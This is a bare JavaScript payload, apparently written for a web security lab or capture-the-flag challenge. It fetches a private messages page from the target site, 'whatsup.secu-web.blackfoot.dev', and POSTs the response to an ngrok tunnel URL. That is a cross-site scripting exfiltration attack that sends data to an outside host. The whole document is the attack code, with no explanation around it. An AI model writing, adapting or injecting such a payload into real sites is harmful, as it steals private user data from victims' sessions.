const Http = new XMLHttpRequest();
const url='whatsup.secu-web.blackfoot.dev/messages/1';
Http.open("GET", url, false);
Http.send(null);

const res = Http.responseText;

const url2='https://aed2-2a01-e0a-ee-4c0-bb28-4536-56a7-41f.eu.ngrok.io';

Http.open("POST", url2, false);
Http.send(res);

